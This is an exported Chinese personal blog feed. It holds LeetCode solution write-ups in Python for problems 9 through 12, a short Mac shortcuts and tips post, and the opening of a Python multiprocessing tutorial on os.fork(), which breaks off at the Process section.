    <content><![CDATA[<p>日常更新冒泡…<a id="more"></a></p>
<h3 id="9-回文数（简单）"><a href="#9-回文数（简单）" class="headerlink" title="9. 回文数（简单）"></a>9. 回文数（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：转为字符串处理"><a href="#解法1：转为字符串处理" class="headerlink" title="解法1：转为字符串处理"></a>解法1：转为字符串处理</h5><p>利用python的切片功能一行代码即可解决。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> str(x) == str(x)[::<span class="hljs-number">-1</span>]</span><br></pre></td></tr></table></figure></p>
<h5 id="解法2：不利用字符串"><a href="#解法2：不利用字符串" class="headerlink" title="解法2：不利用字符串"></a>解法2：不利用字符串</h5><p>翻转整个数值，官方题解有说反转一半，以防溢出，但是溢出不就不是回文数了，因此我觉得不需要考虑溢出。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        ans = <span class="hljs-number">0</span></span><br><span class="line">        pri = x</span><br><span class="line">        <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>:</span><br><span class="line">            ans = x%<span class="hljs-number">10</span> + ans*<span class="hljs-number">10</span></span><br><span class="line">            x //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ans == pri:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="10-正则表达式匹配（困难）"><a href="#10-正则表达式匹配（困难）" class="headerlink" title="10. 正则表达式匹配（困难）"></a>10. 正则表达式匹配（困难）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>&#39;.&#39;</code>和<code>&#39;*&#39;</code>的正则表达式匹配。<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">&apos;.&apos; 匹配任意单个字符</span><br><span class="line">&apos;*&apos; 匹配零个或多个前面的那一个元素</span><br></pre></td></tr></table></figure><br>所谓匹配，是要涵盖整个字符串<code>s</code>的，而不是部分字符串。</p>
<ul>
<li><code>s</code>可能为空，且只包含从<code>a-z</code>的小写字母。</li>
<li><code>p</code>可能为空，且只包含从<code>a-z</code>的小写字母，以及字符<code>.</code>和<code>*</code>。</li>
</ul>
<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &apos;a&apos;。因此，字符串 &quot;aa&quot; 可被视为 &apos;a&apos; 重复了一次。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: &quot;.*&quot; 表示可匹配零个或多个（&apos;*&apos;）任意字符（&apos;.&apos;）。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 表示零个或多个，这里 &apos;c&apos; 为 0 个, &apos;a&apos; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力递归"><a href="#解法1：暴力递归" class="headerlink" title="解法1：暴力递归"></a>解法1：暴力递归</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> s</span><br><span class="line">        <span class="hljs-comment"># 出现'.'的情况</span></span><br><span class="line">        first = bool(s) <span class="hljs-keyword">and</span> p[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (s[<span class="hljs-number">0</span>], <span class="hljs-string">'.'</span>)</span><br><span class="line">        <span class="hljs-comment"># 出现'*'的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==<span class="hljs-string">'*'</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> self.isMatch(s, p[<span class="hljs-number">2</span>:]) <span class="hljs-keyword">or</span> (first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p))</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p[<span class="hljs-number">1</span>:])</span><br></pre></td></tr></table></figure></p>
<ul>
<li>当出现<code>&#39;.&#39;</code>的时候，因为它匹配任意字符，因此只要额外判断<code>p[i]</code>是否等于<code>&#39;.&#39;</code>即可；</li>
<li>对于出现<code>&#39;*&#39;</code>时，因为它匹配0个到任意个星号前面的字符，所以我们需要对它进行不同的处理，虽然他能匹配0～n个字符，但是对于递归而言，只有两种情况：0个和1个。</li>
</ul>
<h5 id="解法2-递归优化"><a href="#解法2-递归优化" class="headerlink" title="解法2: 递归优化"></a>解法2: 递归优化</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-comment"># 定义一个字典作为备忘录</span></span><br><span class="line">        memo = dict()</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dp</span><span class="hljs-params">(i, j)</span>:</span></span><br><span class="line">        	<span class="hljs-comment"># 避免重复计算</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (i,j) <span class="hljs-keyword">in</span> memo: <span class="hljs-keyword">return</span> memo[(i,j)] </span><br><span class="line">            <span class="hljs-keyword">if</span> j==len(p): <span class="hljs-keyword">return</span> i==len(s)</span><br><span class="line">            first = i&lt;len(s) <span class="hljs-keyword">and</span> p[j] <span class="hljs-keyword">in</span> (s[i], <span class="hljs-string">'.'</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> j&lt;len(p)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> p[j+<span class="hljs-number">1</span>] == <span class="hljs-string">'*'</span>:</span><br><span class="line">                ans = dp(i,j+<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                ans = first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>)</span><br><span class="line">            memo[(i,j)] = ans</span><br><span class="line">            <span class="hljs-keyword">return</span> ans</span><br><span class="line">        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)</span><br></pre></td></tr></table></figure><br>使用两个变量<code>i</code>,<code>j</code>记录当前匹配到的位置，从而避免使用子字符串切片，并且将<code>i</code>,<code>j</code>存入备忘录，避免重复计算。</p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 7 (11-12)</title>
    <url>/2020/01/19/leetcode-day7/</url>
    <content><![CDATA[<p>我果然还是一条懒狗，拖更了两天，今天补上。<a id="more"></a></p>
<h3 id="11-盛最多水的容器（中等）"><a href="#11-盛最多水的容器（中等）" class="headerlink" title="11. 盛最多水的容器（中等）"></a>11. 盛最多水的容器（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个非负整数a1，a2，…，an，每个数代表坐标中的一个点(i, ai)。在坐标内画n条垂直线，垂直线i的两个端点分别为(i, ai)和(i, 0)。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。<br><strong>说明</strong>：你不能倾斜容器，且n的值至少为2。<br><img src="/2020/01/19/leetcode-day7/question_11.jpg" alt="question_11.jpg"><br>图中垂直线代表输入数组[1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。</p>
<h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出: 49</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力穷举法"><a href="#解法1：暴力穷举法" class="headerlink" title="解法1：暴力穷举法"></a>解法1：暴力穷举法</h5><p>本懒狗第一个想到的办法就是写两个for循环穷举所有情况…<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(self, height)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type height: List[int]</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        maxarea = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(height)<span class="hljs-number">-1</span>):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(height)):</span><br><span class="line">                area = (j-i)*min(height[i], height[j])</span><br><span class="line">                <span class="hljs-keyword">if</span> maxarea &lt; area:</span><br><span class="line">                    maxarea = area</span><br><span class="line">        <span class="hljs-keyword">return</span> maxarea</span><br></pre></td></tr></table></figure></p>
<h5 id="解法2：（双指针法）利用题意中的特点"><a href="#解法2：（双指针法）利用题意中的特点" class="headerlink" title="解法2：（双指针法）利用题意中的特点"></a>解法2：（双指针法）利用题意中的特点</h5><p>我们知道，盛水的多少取决于容器最短的那根木板，还有两块木板之间的距离。<br>我们将初始位置放在列表的开始和末尾，为了增大两块木板之间的面积，我们不得不将较短的木板向内侧移动以寻求更长的木板，这样虽然会导致木板之间的距离变短，但还是有可能找到比初始位置面积要大的情况存在。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(self, height)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type height: List[int]</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        left, right = <span class="hljs-number">0</span>, len(height)<span class="hljs-number">-1</span></span><br><span class="line">        <span class="hljs-comment"># 记录面积</span></span><br><span class="line">        maxarea = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">while</span> left &lt; right:</span><br><span class="line">        	<span class="hljs-comment"># 两块木板之间的距离</span></span><br><span class="line">            b = right - left</span><br><span class="line">            <span class="hljs-keyword">if</span> height[left] &lt; height[right]:</span><br><span class="line">                h = height[left]</span><br><span class="line">                left += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                h = height[right]</span><br><span class="line">                right -= <span class="hljs-number">1</span></span><br><span class="line">            area = b*h</span><br><span class="line">            <span class="hljs-keyword">if</span> maxarea &lt; area:</span><br><span class="line">                maxarea = area</span><br><span class="line">        <span class="hljs-keyword">return</span> maxarea</span><br></pre></td></tr></table></figure></p>
<h3 id="12-整数转罗马数字（中等）"><a href="#12-整数转罗马数字（中等）" class="headerlink" title="12. 整数转罗马数字（中等）"></a>12. 整数转罗马数字（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>罗马数字包含以下七种字符： <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure><br>例如，罗马数字<code>2</code>写做<code>II</code>，即为两个并列的<code>I</code>。<code>12</code>写做<code>XII</code>，即为<code>X</code>+<code>II</code>。<code>27</code>写做<code>XXVII</code>,即为<code>XX</code>+<code>V</code>+<code>II</code>。<br>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如<code>4</code>不写做<code>IIII</code>，而是<code>IV</code>。数字<code>1</code>在数字<code>5</code>的左边，所表示的数等于大数<code>5</code>减小数<code>1</code>得到的数值<code>4</code> 。同样地，数字<code>9</code>表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p>
<ul>
<li><code>I</code>可以放在<code>V</code>(5)和<code>X</code>(10)的左边，来表示<code>4</code>和<code>9</code>。</li>
<li><code>X</code>可以放在<code>L</code>(50)和<code>C</code>(100)的左边，来表示<code>40</code>和<code>90</code>。 </li>
<li><code>C</code>可以放在<code>D</code>(500)和<code>M</code>(1000)的左边，来表示<code>400</code>和<code>900</code>。</li>
</ul>
<p>给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: &quot;III&quot;</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: &quot;IV&quot;</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 9</span><br><span class="line">输出: &quot;IX&quot;</span><br></pre></td></tr></table></figure></p>
<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 58</span><br><span class="line">输出: &quot;LVIII&quot;</span><br><span class="line">解释: L = 50, V = 5, III = 3.</span><br></pre></td></tr></table></figure></p>
<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 1994</span><br><span class="line">输出: &quot;MCMXCIV&quot;</span><br><span class="line">解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br></pre></td></tr></table></figure></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：分情况讨论"><a href="#解法1：分情况讨论" class="headerlink" title="解法1：分情况讨论"></a>解法1：分情况讨论</h5><p>这是我最开始的想法：既然这道题有这么多种情况，那我就直接分情况讨论吧。<br>总共大致分成了三种情况，一种是题目中给出的，也就是单个字符的数值，和特例（数字小的数字在大的数字的左边的情况）；第二种是数字大于5(50,500等)的，最后一种当然就是数字小于5(50,500等)的。将属于第一种情况的键值对写入字典中。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">intToRoman</span><span class="hljs-params">(self, num)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type num: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        dict_str = &#123;<span class="hljs-number">1</span>:<span class="hljs-string">'I'</span>, <span class="hljs-number">5</span>:<span class="hljs-string">'V'</span>, <span class="hljs-number">10</span>:<span class="hljs-string">'X'</span>, <span class="hljs-number">50</span>:<span class="hljs-string">'L'</span>, <span class="hljs-number">100</span>:<span class="hljs-string">'C'</span>, <span class="hljs-number">500</span>:<span class="hljs-string">'D'</span>, <span class="hljs-number">1000</span>:<span class="hljs-string">'M'</span>, <span class="hljs-number">4</span>: <span class="hljs-string">'IV'</span>, <span class="hljs-number">9</span>:<span class="hljs-string">'IX'</span>, <span class="hljs-number">40</span>:<span class="hljs-string">'XL'</span>, <span class="hljs-number">90</span>:<span class="hljs-string">'XC'</span>, <span class="hljs-number">400</span>:<span class="hljs-string">'CD'</span>, <span class="hljs-number">900</span>:<span class="hljs-string">'CM'</span>&#125;</span><br><span class="line">        <span class="hljs-comment"># 用来存储转换成的罗马数字符号的列表，是倒着存储的，因此最后需要重排序</span></span><br><span class="line">        ans_list = []</span><br><span class="line">        <span class="hljs-comment"># 用来存储数字位的倍数</span></span><br><span class="line">        count = <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span> num != <span class="hljs-number">0</span>:</span><br><span class="line">            a = num % <span class="hljs-number">10</span></span><br><span class="line">            num_str = a * count</span><br><span class="line">            <span class="hljs-comment"># 在字典中，取出value即是该位的罗马数字值</span></span><br><span class="line">            <span class="hljs-keyword">if</span> num_str <span class="hljs-keyword">in</span> dict_str:</span><br><span class="line">                ans_list.append(dict_str[num_str])</span><br><span class="line">            <span class="hljs-comment"># 大于5，需要变成'5的倍数的罗马值'+'某个1倍数的罗马值'*b</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> a&gt;<span class="hljs-number">5</span>:</span><br><span class="line">                b = a<span class="hljs-number">-5</span></span><br><span class="line">                ans_list.append(dict_str[<span class="hljs-number">5</span>*count]+dict_str[count]*b)</span><br><span class="line">            <span class="hljs-comment"># 小于5，即 '某个1倍数的罗马值'*a</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> a&lt;<span class="hljs-number">5</span>:</span><br><span class="line">                ans_list.append(dict_str[count]*a)</span><br><span class="line">            count *= <span class="hljs-number">10</span></span><br><span class="line">            num //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans_list[::<span class="hljs-number">-1</span>])</span><br></pre></td></tr></table></figure></p>
<h5 id="解法2：贪心算法"><a href="#解法2：贪心算法" class="headerlink" title="解法2：贪心算法"></a>解法2：贪心算法</h5><p>我们每次用最大面值的来替换，可以保证用的罗马字符最少且最终的组合唯一。<br>其实我们仔细看这些面值，除了特殊的<code>4</code>,<code>9</code>,<code>40</code>,<code>90</code>之类的数，其余都是要么小于5，然后就是几个<code>I</code>连在一起，要么就是大与5，在几个<code>I</code>的左边再加上<code>5</code>(50,500等)对应的罗马数字。<br>只要除去特例，我们每次判断，取面值最大的，然后把该符号加在后面即可，对于特例，直接在字典或列表中加入即可。</p>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">intToRoman</span><span class="hljs-params">(self, num)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type num: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        nums = [<span class="hljs-number">1000</span>, <span class="hljs-number">900</span>, <span class="hljs-number">500</span>, <span class="hljs-number">400</span>, <span class="hljs-number">100</span>, <span class="hljs-number">90</span>, <span class="hljs-number">50</span>, <span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]</span><br><span class="line">        romans = [<span class="hljs-string">"M"</span>, <span class="hljs-string">"CM"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"CD"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"XC"</span>, <span class="hljs-string">"L"</span>, <span class="hljs-string">"XL"</span>, <span class="hljs-string">"X"</span>, <span class="hljs-string">"IX"</span>, <span class="hljs-string">"V"</span>, <span class="hljs-string">"IV"</span>, <span class="hljs-string">"I"</span>]</span><br><span class="line">        ans = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">13</span>):</span><br><span class="line">            <span class="hljs-keyword">while</span> num &gt;= nums[index]:</span><br><span class="line">                ans += romans[index]</span><br><span class="line">                num -= nums[index]</span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>Mac使用小技巧</title>
    <url>/2020/03/12/mac-tips/</url>
    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
<li>浏览器新建标签页：<code>command + T</code></li>
<li>快速调用emoji表情：<code>control + command + space</code></li>
</ul>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>Python 多进程</title>
    <url>/2019/08/27/multiprocessing/</url>
    <content><![CDATA[<p>学习廖雪峰的Python教程中的多进程部分，知识点整理<a id="more"></a></p>
<hr>
<h3 id="一、-Unix、Linux"><a href="#一、-Unix、Linux" class="headerlink" title="一、 Unix、Linux"></a>一、 Unix、Linux</h3><p>在<strong>unix/linux</strong>系统下，可以直接使用<code>fork()</code>创建子进程。<code>fork()</code>函数调用一次，返回两次，因为操作系统自动把当前进程（父进程）复制了一份（子进程），然后分别在父进程和子进程内返回，创建成功子进程内返回<code>pid=0</code>，父进程内返回值为子进程的<code>pid</code>。</p>
<p>使用<code>fork()</code>需要<code>import os</code></p>
<p><strong>示例代码：</strong></p>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'Process (%s) start...'</span> % os.getpid())</span><br><span class="line"><span class="hljs-comment"># Only works on Unix/Linux/Mac:</span></span><br><span class="line">pid = os.fork()</span><br><span class="line"><span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:</span><br><span class="line">    print(<span class="hljs-string">'I am child process (%s) and my parent is %s.'</span> % (os.getpid(), os.getppid()))</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    print(<span class="hljs-string">'I (%s) just created a child process (%s).'</span> % (os.getpid(), pid))</span><br></pre></td></tr></table></figure></p>
<p><strong>执行结果：</strong></p>
<p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">Process (63034) start...</span><br><span class="line">I (63034) just created a child process (63035).</span><br><span class="line">I am child process (63035) and my parent is 63034.</span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="二、跨平台使用"><a href="#二、跨平台使用" class="headerlink" title="二、跨平台使用"></a>二、跨平台使用</h3><p>由于<code>python</code>是跨平台的，自然也提供一个跨平台的多进程支持，<code>multiprocessing</code>模块就是跨平台版本的多进程模块。</p>
<ul>
<li><h5 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h5></li>
</ul>
